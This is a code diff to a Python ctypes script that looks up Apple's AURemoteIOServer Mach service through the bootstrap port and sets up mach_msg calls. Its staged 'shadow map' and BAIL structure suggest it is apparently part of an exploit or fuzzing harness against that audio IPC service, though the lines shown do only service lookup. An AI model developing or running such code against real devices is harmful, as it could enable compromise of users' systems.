@@ -46,8 +46,7 @@ print(f"shadow_va={hex(shadow_va)} ne={ne.value} kr={kr}")
 if kr != 0: print("BAIL: shadow map"); raise SystemExit(1)
 
 # === Stage 2: Lookup AURemoteIOServer MIG port ===
-L.task_get_bootstrap_port.argtypes = [C.c_uint32, C.POINTER(C.c_uint32)]
-L.task_get_bootstrap_port.restype = C.c_int32
+# bootstrap_port is a global in libSystem; task_get_bootstrap_port is not exported
 L.bootstrap_look_up.argtypes = [C.c_uint32, C.c_char_p, C.POINTER(C.c_uint32)]
 L.bootstrap_look_up.restype = C.c_int32
 L.mach_reply_port.restype = C.c_uint32
@@ -55,10 +54,10 @@ L.mach_msg.restype = C.c_int32
 L.mach_msg.argtypes = [C.c_void_p, C.c_uint32, C.c_uint32, C.c_uint32,
                         C.c_uint32, C.c_uint32, C.c_uint32]
 
-bs = C.c_uint32(0)
-L.task_get_bootstrap_port(t, C.byref(bs))
+bs = C.c_uint32.in_dll(L, "bootstrap_port").value
+print(f"bootstrap_port={bs}")
 svc = C.c_uint32(0)
-kr = L.bootstrap_look_up(bs.value, b"com.apple.audio.AURemoteIOServer", C.byref(svc))
+kr = L.bootstrap_look_up(bs, b"com.apple.audio.AURemoteIOServer", C.byref(svc))
 print(f"svc_lookup kr={kr} port={svc.value}")
 if kr != 0 or svc.value == 0: print("BAIL: lookup"); raise SystemExit(1)
 
